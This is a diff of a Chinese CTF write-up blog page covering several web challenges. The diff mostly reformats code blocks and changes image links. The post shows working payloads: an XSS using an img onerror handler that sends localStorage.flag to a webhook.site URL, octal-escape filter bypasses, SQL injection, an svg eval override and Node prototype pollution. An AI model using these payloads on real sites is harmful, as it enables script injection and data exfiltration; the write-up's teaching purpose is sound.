@@ -85,19 +85,19 @@
         <article>
             <h2 id="knock-knock">knock-knock</h2>
 <p>题目的主要逻辑是：创建一个note会返回这个note在数组中的下标<code>id</code>然后和对应的访问<code>token</code>，然后flag在程序启动的时候就push到了数组中，其下标也就是id应该为0。所以我们为了获取到flag，只要获取到对应的token即可，其中的token是如此生成的</p>
-<pre tabindex="0"><code>class Database {
-  constructor() {
-    this.notes = [];
-    this.secret = `secret-${crypto.randomUUID}`;
-  }
-  generateToken(id) {
-    return crypto
-      .createHmac(&#39;sha256&#39;, this.secret)
-      .update(id.toString())
-      .digest(&#39;hex&#39;);
-  }
-}
-</code></pre><p>所以因为我们的目的是要伪造token，所以我们需要知道它的<code>secret</code>，这里的<code>secret</code>使用模板语法，取了crypto的randomUUID值，因为没有用（）调用函数，所以返回的是函数体，也就是固定内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`secret-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomUUID</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">id</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">secret</span>)
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">toString</span>())
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>所以因为我们的目的是要伪造token，所以我们需要知道它的<code>secret</code>，这里的<code>secret</code>使用模板语法，取了crypto的randomUUID值，因为没有用（）调用函数，所以返回的是函数体，也就是固定内容</p>
 <!-- raw HTML omitted -->
 <h2 id="blazingfast">blazingfast</h2>
 <p>简单读一下<code>bot.js</code>发现目的是要<code>XSS</code>，然后查看<code>index.html</code>中执行的<code>js</code></p>
@@ -121,21 +121,21 @@
 <p>WebAssembly 被设计为可以和 JavaScript 一起协同工作——通过使用 WebAssembly 的 JavaScript  API，你可以把 WebAssembly 模块加载到一个 JavaScript 应用中并且在两者之间共享功能。这允许你在同一个应用中利用  WebAssembly 的性能和威力以及 JavaScript 的表达力和灵活性，即使你可能并不知道如何编写 WebAssembly 代码。</p>
 </blockquote>
 <p>类似于去加载<code>/blazingfast.wasm</code>文件，然后使用在<code>.wasm</code>中定义的方法，使用<code>WebAssembly</code> 的好处是加快运行的速度，类似于汇编，相同的代码使用<code>.wasm</code>明显比使用<code>js</code>编写快。阅读上面那段代码发现有两种接收参数的方式，一种是获得<code>id</code>为<code>demo</code>内的值，也就页面中的输入框，一种是通过</p>
-<pre tabindex="0"><code>let query = new URLSearchParams(window.location.search).get(&#39;demo&#39;);
-</code></pre><p>获得<code>?demo=</code>后的值，然后一样赋值给<code>document.getElementById('demo').value</code>。然后对于输入的值作为参数传入<code>demo</code>函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;demo&#39;</span>);
+</span></span></code></pre></div><p>获得<code>?demo=</code>后的值，然后一样赋值给<code>document.getElementById('demo').value</code>。然后对于输入的值作为参数传入<code>demo</code>函数</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">demo</span>(<span style="color:#a6e22e">str</span>) {
 </span></span><span style="display:flex;"><span>	document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;result&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mock</span>(<span style="color:#a6e22e">str</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>又进入<code>mock</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131944950.png" alt="image-20230113194451902"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301131944950.png" alt="image-20230113194451902"></p>
 <p>这里的<code>blazingfast</code>是在上面利用<code>WebAssembly</code> 加载<code>/blazingfast.wasm</code>暴露实例出来的对象，也就是附件中的</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131944441.png" alt="image-20230113194412207"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301131944441.png" alt="image-20230113194412207"></p>
 <p>可以看到在mock中将用户输入的长度作为init传入，然后后面检查的长度是最初传入的长度，然后经过<code>str.toUpperCase()</code>后将结果遍历进入<code>mock</code>，这里利用一些特殊字符经过<code>toUpperCase()</code>的特性来绕过检测</p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131948929.png" alt="image-20230113194835887"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301131948929.png" alt="image-20230113194835887"></p>
 <p>然后就是命令执行的问题，因为程序会将输入全转换为大写，又js是大小写敏感的语言，所以一些常见的payload无法使用，比如<code>window.open</code>要是要取得<code>localStorage.flag</code> 得通过<code>+localStorage.flag</code>但是这里就得逃出字符串的范围了，大写后无法执行，这里得用fetch，异步执行然后使用模板变量取得，这里使用<code>localStorage.flag</code>的值</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39;&#39;[&#39;at&#39;][&#39;__proto__&#39;][&#39;constructor&#39;](&#39;fetch(`https://webhook.site/689e62cc-c516-4cec-a302-9bdc67202cc5?Q=${localStorage.flag}`)&#39;)()&#34;</span><span style="color:#f92672">/&gt;</span>
 </span></span></code></pre></div><p>因为上面说的js是大小写敏感所以直接使用会报错 <code>&quot;&quot;.AT is undefined</code>因为只有at函数没有AT函数，这里的at随便一个字符串内置的就行，目的是要拿到<code>Function</code></p>
-<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301132005714.png" alt="image-20230113200555660"></p>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301132005714.png" alt="image-20230113200555660"></p>
 <p>利用字符串的特性，利用八进制绕过，脚本简单实现</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
 </span></span><span style="display:flex;"><span>
@@ -190,8 +190,8 @@ INSERT INTO notes VALUES (&#39;123&#39;, &#39;a &#39;, :mode, 0, 0) -- &#39;&#39
 INSERT INTO notes VALUES (&#39;123&#39;, &#39;a &#39;, &#39;payload&#39;, 0, 0) -- &#39;&#39;, &#39;, &#39;payload&#39;, 0, 0) -- &#39;, :mode, 0)
 </code></pre><p>另一种解法是</p>
 <p>利用<code>&lt;svg&gt;&lt;svg/onload=eval(name)&gt;</code>可以在下一个</p>
-<pre tabindex="0"><code>document.querySelector(&#39;.views&#39;).innerText = views;
-</code></pre><p>执行前执行代码，然后通过覆盖方法，然后使用arguments.callee.caller重新调用一次函数，然后执行的是我们覆盖完成的结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;.views&#39;</span>).<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">views</span>;
+</span></span></code></pre></div><p>执行前执行代码，然后通过覆盖方法，然后使用arguments.callee.caller重新调用一次函数，然后执行的是我们覆盖完成的结果</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">password</span>) <span style="color:#75715e">// flag
@@ -208,8 +208,8 @@ INSERT INTO notes VALUES (&#39;123&#39;, &#39;a &#39;, &#39;payload&#39;, 0, 0) 
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#34;admin&#34;</span>, { <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fsp</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>) });
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>这里用到了nodejs的1day，去污染<code>Object.prototype[0]</code>，让它变为空字符串，即可绕过检查</p>
-<pre tabindex="0"><code>console.table([{x:1}], [&#34;__proto__&#34;]);
-</code></pre><p>污染的的位置在map中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">table</span>([{<span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>}], [<span style="color:#e6db74">&#34;__proto__&#34;</span>]);
+</span></span></code></pre></div><p>污染的的位置在map中</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// tabularData 是第一個參數 [{x:1}]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// properties 是第二個參數 [&#34;__proto__&#34;]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ObjectCreate</span>(<span style="color:#66d9ef">null</span>);
